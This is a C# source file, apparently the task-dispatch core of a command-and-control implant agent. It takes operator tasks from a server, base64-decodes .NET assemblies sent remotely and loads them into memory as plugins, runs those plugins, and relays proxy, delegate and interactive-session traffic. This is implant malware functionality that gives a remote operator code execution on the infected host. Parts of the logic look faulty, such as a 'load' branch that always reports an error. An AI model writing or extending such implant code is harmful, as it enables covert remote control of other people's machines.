using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text.Json;

namespace Agent.Managers
{
    public class TaskManager : ITaskManager
    {
        private ILogger logger { get; set; }
        public IAssemblyManager assemblyManager { get; set; }
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        public TaskManager(ILogger logger, IAssemblyManager assemblyManager, IMessageManager messageManager, ITokenManager tokenManager)
        {
            this.logger = logger;
            this.assemblyManager = assemblyManager;
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }

        public async Task StartTaskAsync(ServerJob job)
        {
            this.messageManager.AddJob(job);
            ResponseResult rr = new ResponseResult()
            {
                task_id = job.task.id,
                status = "completed",
                user_output = ""
            };

            switch (job.task.command)
            {
                case "load":
                    LoadCommand loadCommand = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                    if (loadCommand is not null)
                    {
                        byte[] buf = await Misc.Base64DecodeToByteArrayAsync(loadCommand.asm);
                        if (buf.Length > 0)
                        {
                            this.assemblyManager.LoadPluginAsync(job.task.id, loadCommand.command, buf);
                        }
                    }
                    rr.process_response = new Dictionary<string, string> { { "message", "" } };
                    rr.status = "error";
                    await this.messageManager.AddResponse(rr);
                    break;
                case "load-assembly":
                    LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                    if (command is not null)
                    {
                        byte[] buf = await Misc.Base64DecodeToByteArrayAsync(command.asm);
                        if (buf.Length > 0)
                        {
                            this.assemblyManager.LoadAssemblyAsync(job.task.id, buf);
                        }
                    }
                    break;
                default:
                    IPlugin plug;

                    if (this.assemblyManager.TryGetPlugin(job.task.command, out plug))
                    {
                        await plug.Execute(job);
                    }
                    else
                    {
                        await this.messageManager.AddResponse(new ResponseResult()
                        {
                            task_id = job.task.id,
                            process_response = new Dictionary<string, string> { { "message", "0x11" } },
                            status = "error",
                            completed = true,
                        });
                    }
                    break;
            }
        }
        public async Task HandleServerResponses(List<ServerResponseResult> responses)
        {
            //To make these loadable, I might need to update the IPlugin Interface to be interactable
            Parallel.ForEach(responses, async response =>
            {
                ServerJob job;

                if(!this.messageManager.TryGetJob(response.task_id, out job))
                {
                    logger.Log($"Job with task id {response.task_id} not found.");
                    return;
                }

                if (this.assemblyManager.TryGetPlugin<IFilePlugin>(job.task.command, out var plugin))
                {
                    responses.ForEach(response => plugin.HandleNextMessage(response));
                }
            });
        }
        public async Task HandleProxyResponses(string type, List<ServerDatagram> responses)
        {
            if (this.assemblyManager.TryGetPlugin<IProxyPlugin>(type, out var plugin))
            {
                responses.ForEach(response => plugin.HandleDatagram(response));
            }
        }
        public async Task HandleDelegateResponses(List<DelegateMessage> responses)
        {
            foreach(var response in responses)
            {
                if (this.assemblyManager.TryGetPlugin<IForwarderPlugin>(response.c2_profile, out var plugin))
                {
                    plugin.ForwardDelegate(response);
                }
            }
        }

        public async Task HandleInteractiveResponses(List<InteractMessage> responses)
        {
            logger.Log($"Handle Interactive Responses.");
            Parallel.ForEach(responses, async response =>
            {
                logger.Log(response.data);
                ServerJob job;

                if (!this.messageManager.TryGetJob(response.task_id, out job))
                {
                    logger.Log($"Job with task id {response.task_id} not found.");
                    return;
                }

                if (this.assemblyManager.TryGetPlugin<IInteractivePlugin>(job.task.command, out var plugin))
                {
                    plugin.Interact(response);
                }
            });
        }
    }
}
